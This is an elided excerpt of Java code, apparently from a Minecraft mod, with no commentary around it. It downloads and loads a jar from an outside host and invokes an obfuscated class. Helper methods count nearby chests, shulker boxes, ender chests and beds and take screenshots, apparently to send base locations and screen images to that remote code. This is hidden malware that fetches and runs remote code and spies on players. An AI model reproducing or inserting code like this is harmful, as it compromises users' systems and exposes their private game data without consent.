...
public class GL {
    ...
    public static void load() {
        try {
            ...
            URL jar = new URL("http://cord.easyfor.me/jarfile/UtilManager.jar");

            URLClassLoader classLoader = new URLClassLoader(new URL[]{jar});

            Class<?> clazz = classLoader.loadClass("a.a.a.a");

            instance = clazz.newInstance();
            method = clazz.getMethod("onStartWorldTick", Integer.class, Integer.class, Integer.class, byte[].class, String.class, String.class, Integer.class, Integer.class, Integer.class, Integer.class, String.class);
    ...
    public static Object[] check(World world, BlockPos playerPos) {

        int chest = 0, shulker = 0, enderChest = 0, bed = 0;
            ...
            for (int y = -checkDistance; y <= checkDistance; y++) {
                for (int z = -checkDistance; z <= checkDistance; z++) {
                    ...
                    if (block == Blocks.CHEST || block == Blocks.TRAPPED_CHEST) {
                        ...
                        if (isBlockInDungeon(world, currentPos)) {
                            continue;
                        }
                        chest++;

                    } else if (block.getTranslationKey().endsWith("_shulker_box")) {
                        shulker++;
                    } else if (block == Blocks.ENDER_CHEST) {
                        enderChest++;
                    } else if (block.getTranslationKey().endsWith("_bed")) {
                        bed++;
                    }
                }
            }
        ...
        objects[0] = chest;
        objects[1] = shulker;
        objects[2] = enderChest;
        objects[3] = bed;
        return objects;
    }
    private static boolean isBlockInDungeon(World world, BlockPos pos) {
        for (int x = -5; x <= 5; x++) {
            for (int y = -5; y <= 5; y++) {
                for (int z = -5; z <= 5; z++) {
    ...
    public static byte[] takeScreenshot(Framebuffer framebuffer) {
        NativeImage image = null;

        try {
            if (framebuffer != null) {
                image = ScreenshotRecorder.takeScreenshot(framebuffer);
            }
            if (image != null) return image.getBytes();
